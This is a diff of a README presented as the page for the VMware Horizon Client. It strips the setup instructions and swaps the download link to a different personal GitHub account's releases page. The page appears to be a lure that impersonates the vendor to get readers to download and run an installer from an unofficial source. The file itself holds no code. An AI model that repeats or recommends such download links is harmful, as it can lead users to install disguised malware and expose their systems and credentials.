@@ -1,17 +1,7 @@
 # VMware Horizon Client
 
-* [Installation](#installation)
-* [System Requirements and Setup](#system-requirements-and-setup)
-* [Installing and Updating Horizon Client](#installing-and-updating-horizon-client)
-* [Configuring Horizon Client](#configuring-horizon-client)
-* [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)
-
-## Installation
-
-Download the latest release from [Releases](https://github.com/tunevra/VMware-Horizon-Client/releases/tag/2412)
-
-Once the download finishes, double-click the installer to launch the setup wizard. Follow the on-screen instructions to select your preferred options—for instance, enabling smart card login, adjusting display settings, or optimizing performance. After installation concludes, open the client and log in using your account credentials.
-If you experience connection difficulties, review your network configuration or consult your IT support team.
+Download latest version from Releases:       
+https://github.com/evtfx/VMware-Horizon-Client/releases/tag/2412
 
 ### System Requirements and Setup
 
@@ -44,13 +34,6 @@ Horizon Client accommodates several authentication methods, including:
 The Windows edition of VMware Horizon Client is compatible with a broad range of desktop and server versions. Refer to VMware’s official documentation for comprehensive compatibility details.
 
 ## Installing and Updating Horizon Client
-
-### Installation Steps
-
-1. Download the installer from [VMware’s GitHub](*).
-2. Execute the `.exe` file and follow the guided setup.
-3. Select either **Typical (Standard)** or **Custom (Advanced)** installation mode.
-4. Accept the license terms and click **Agree & Install**. Restart the computer if prompted.
 
 ### Silent Installation Parameters
 
@@ -154,14 +137,3 @@ vmware-view://server?connectUSBOnStartup=true
 
 * Improve online meetings with **Real-Time Audio-Video (RTAV)**.
 * Choose your **Preferred Audio Input and Output Devices** for better clarity.
-
-## Security and Authentication Features
-
-### Smart Card and Certificate Access
-
-* Ensure **Smart Card Drivers** are installed and current.
-* Use **Certificate-Based Authentication** to strengthen security.
-
-### Viewing Log Files
-
-Access log files here:
